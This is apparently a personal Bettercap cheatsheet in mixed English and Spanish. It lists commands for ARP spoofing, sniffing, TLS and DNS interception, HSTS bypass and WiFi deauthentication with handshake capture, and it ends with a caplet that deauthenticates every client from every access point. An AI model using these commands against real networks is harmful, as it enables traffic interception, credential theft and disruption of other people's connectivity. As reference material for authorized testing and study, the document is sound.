# 🕵️‍♀️ **Bettercap Cheatsheet** 🕵️

Bettercap is an indispensable tool for network reconnaissance, sniffing, and executing Man-In-The-Middle (MITM) attacks on local networks.

## Table of Contents

1. [🔍 Network Reconnaissance](#-network-reconnaissance)
2. [🥷 ARP Spoofing](#-arp-spoofing)
3. [📡 Network Sniffing](#-network-sniffing)  
4. [🕸 Web Proxy](#-web-proxy)
5. [🚦 TLS Proxy](#-tls-proxy)
6. [🌀 DNS Spoofing](#-dns-spoofing)
7. [💻 HTTPS & HSTS Bypass](#-https--hsts-bypass)
8. [📌 Miscellaneous Commands](#-miscellaneous-commands)

---

## 🔍 **Network Reconnaissance**

- `net.probe on` 👀

- Initiate an ARP scan to discover live hosts on the network.

- `net.show` 📡  

- Display detected devices on the network, complete with IPs, MAC addresses, and other details.

- `net.recon on/off` 🕵️‍♂️

- Enable/disable passive network traffic analysis to discover hosts.

---

## 🥷 **ARP Spoofing** 

- `set arp.spoof.targets [IP]` ✨

- Designate a target IP for ARP cache poisoning to reroute its traffic.

- `arp.spoof on/off` 💥

- Engage/disengage ARP spoofing against the chosen target. 

- `set arp.spoof.internal true` 🔁

- Poison ARP caches for all connections between internal hosts on the LAN.

---

## 📡 **Network Sniffing**

- `net.sniff on/off` ▶️⏸️

- Begin/halt packet capture to log network traffic.

---

## 🕸 **Web Proxy**

- `set proxy.port [PORT]` 🤖

- Assign the listening port for the proxy server.

- `proxy on/off` 🎚️🛑

- Activate/deactivate the proxy server to intercept and manipulate HTTP requests.

---

## 🚦 **TLS Proxy** 

- `tls.proxy on/off` 🔓🔒

- Enable/disable the TLS proxy. This intercepts and decrypts HTTPS traffic by mimicking certificate validation.

---

## 🌀 **DNS Spoofing**

- `set dns.spoof.domains [DOMAIN]` 🌐

- Select a domain for DNS hijacking.  

- `dns.spoof on` 🥷

- Activate DNS response spoofing for the specified domain.

---

## 💻 **HTTPS & HSTS Bypass**

- `hstshijack.load` 🛡️

- Load the module to overcome HSTS, a web security protocol, useful for exploiting HTTPS sites.

---

## 📌 **Miscellaneous Commands**

- `events.clear` 🧹

- Wipe out all recorded network events.

- `set [OPTION] [VALUE]` ⚙️

- Adjust configuration options to suit your needs.

- `help` ❓

- Display the help menu with an overview of commands.

## Modulo wifi

### Reconocimiento
```bash
wifi.recon on
```

#### Visualizacion / Filtros
```bash
# Especific Channels
wifi.recon.channel 6,11
```
```bash
# Especific BSSID
wifi.recon AA:BB:CC:DD:EE:FF
wifi.show
```
```bash
wifi.show
```
```bash
set wifi.show.sort clients desc
```
```bash
set wifi.show.filter "WPA"
```
```bash
set wifi.show.filter ^c0
wifi.show
```
#### Automatizacion
```bash
set ticker.commands "clear; wifi.show"
```
```bash
wifi.recon on
```
```bash
ticker on
```
```bash
sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
```
```bash
set wifi.show.filter ""
```
```bash
set wifi.rssi.min -49
wifi.show
```
### Deautenticacicon

```bash
# Especific AP BSSID
wifi.deauth AA:BB:CC:DD:EE:FF
```
```bash
# Especific Client MAC Address
wifi.deauth GG:HH:II:JJ:KK:LL
```
```bash
# Obtiene el archivo de handshakes
get wifi.handshakes.file 
# result
wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'
# Set handshake output 
set wifi.handshakes.file "/home/kali/handshakes/"

# Envía los protocolos de enlace de 4 vías a una carpeta
set wifi.handshakes.aggregate false
# Activa modulo wifi.recon
wifi.recon on
# Deautentica un AP
wifi.deauth c6:2d:56:2a:53:f8
```
* Adicionales
```bash
wifi.deauth.acquired
wifi.deauth.open
wifi.deauth.silent
```
#### Lista de omision (deauth skip list)
```bash
# Agregamos MAC de Client que no queremos atacar
set wifi.deauth.skip ac:22:0b:28:fd:22
```
## Caplets (Interfaz de scripting)

Caplets son pequeños scripts de Bettercap que automatizan la configuración y ejecución de módulos. Se guardan como archivos de texto y se cargan al iniciar Bettercap o desde la consola.

- Ubicación típica:
```bash
/usr/share/bettercap/caplets/
```

- ¿Qué contienen?
    - comandos Bettercap uno por línea (set, wifi.recon on, ticker on, etc.).
    - variables, comentarios y secuencias de ticker para tareas repetitivas.

- Cargar un caplet (ejemplo):
    - Al iniciar: bettercap -caplet /ruta/a/mi.caplet
    - Desde la consola: caplet /ruta/a/mi.caplet

- Buenas prácticas
    - Revisar el contenido del caplet antes de ejecutarlo.
    - Probar en un entorno controlado o laboratorio.
    - Evitar ejecutar caplets no confiables que contengan acciones intrusivas (deauth, spoofing, etc.) en redes ajenas.

Ejemplo de caplet seguro para monitorización (solo lectura/visualización):

```bash
# monitor.cap - muestra redes Wi‑Fi y hosts periódicamente
set ticker.period 10
set ticker.commands "clear; wifi.show; net.show"
set wifi.show.filter ""
wifi.recon on
net.recon on
ticker on
# opcional: registrar eventos
events.write /tmp/bettercap-events.log
```

Crear un caplet propio
- Guardar el contenido en un archivo con extensión .cap o sin extensión.
- Controlar variables con `set NOMBRE VALOR`.
- Usar `#` para comentarios.
- Testear incrementalmente: ejecutar comandos desde la consola antes de automatizar.

Ejemplos útiles (seguro/educativo)
- caplets de ejemplo en la carpeta de instalación pueden servir como plantilla; leerlos detenidamente.
- Caplets para monitorización, logging y pruebas en laboratorio son recomendables.

```bash
cat /usr/share/bettercap/caplets/massdeauth.cap 
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}

# every 10 seconds deauth every client from every ap
set ticker.period 10
set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff

# uncomment to only hop on these channels:
# wifi.recon.channel 1,2,3

wifi.recon on
ticker on
events.clear
clear
```
